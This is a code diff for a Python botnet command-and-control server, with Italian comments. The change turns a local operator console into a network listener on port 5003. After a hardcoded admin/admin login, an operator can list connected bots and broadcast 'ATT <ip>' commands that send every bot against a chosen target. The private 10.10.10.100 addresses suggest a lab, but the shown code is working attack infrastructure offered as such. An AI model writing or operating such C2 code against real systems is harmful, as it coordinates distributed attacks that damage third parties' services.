@@ -2,11 +2,14 @@
 import socket
 import threading
 import requests
+import time
 
 REPORT_SERVER = "http://10.10.10.100:5000"
 
 CNC_IP = "0.0.0.0" #"10.10.10.100"
 CNC_PORT = 5002
+CNC_PORT_TO_ATTACKER = 5003
+
 
 ATTACKER_USER = "admin"
 ATTACKER_PASS = "admin"
@@ -49,49 +52,65 @@ def start_server():
 
 
 # LOGIN 
-def login():
-    user = input("Username: ")
-    pwd = input("Password: ")
+def handle_attacker(conn):
+    conn.send(b"Username: ")
+    user = conn.recv(1024).decode().strip()
 
-    if user == ATTACKER_USER and pwd == ATTACKER_PASS:
-        print("[+] Login successful")
-        return True
-    else:
-        print("[-] Invalid credentials")
-        return False
+    conn.send(b"Password: ")
+    pwd = conn.recv(1024).decode().strip()
 
+    if user != ATTACKER_USER or pwd != ATTACKER_PASS:
+        conn.send(b"Login failed\n")
+        conn.close()
+        return
 
-# INVIO ATTACCO
-def launch_attack():
-    target = input("Target IP: ")
+    conn.send(b"CNC access granted\n")
 
-    print(f"[CNC] Sending attack to {len(bots)} bots")
-
-    for bot in bots:
-        try:
-            bot.send(f"ATT {target}\n".encode())
-        except:
-            print("[-] Failed to send to a bot")
-
-
-# MAIN ATTACK LOOP
-def attacker_shell():
     while True:
-        cmd = input("CNC> ")
+        conn.send(b"> ")
+        cmd = conn.recv(1024).decode().strip()
 
-        if cmd == "attack":
-            launch_attack()
-        elif cmd == "list":
-            print(f"Connected bots: {len(bots)}")
+        if cmd == "list":
+            conn.send(f"Bots: {len(bots)}\n".encode())
+
+        elif cmd.startswith("attack"):
+            parts = cmd.split()
+            if len(parts) < 2:
+                conn.send(b"Usage: attack <ip>\n")
+                continue
+
+            target = parts[1]
+
+            for bot in bots:
+                try:
+                    bot.send(f"ATT {target}\n".encode())
+                except:
+                    pass
+
+            conn.send(b"Attack sent\n")
+
         elif cmd == "exit":
             break
-        else:
-            print("Commands: attack, list, exit")
+
+    conn.close()
+
+def start_attacker_server():
+    s = socket.socket()
+    s.bind((CNC_IP,CNC_PORT_TO_ATTACKER))
+    s.listen()
+    
+    print("listening on 5003")
+    while True:
+        conn,_ = s.accept()
+        threading.Thread(target=handle_attacker, args=(conn,), daemon= True).start()
 
 
 
 if __name__ == "__main__":
-    threading.Thread(target=start_server, daemon=True).start()
+    threading.Thread(target=start_server, daemon = True).start()
 
-    if login():
-        attacker_shell()
+    threading.Thread(target=start_attacker_server, daemon = True).start()
+    #start_server()
+
+    while True:
+        time.sleep(1)
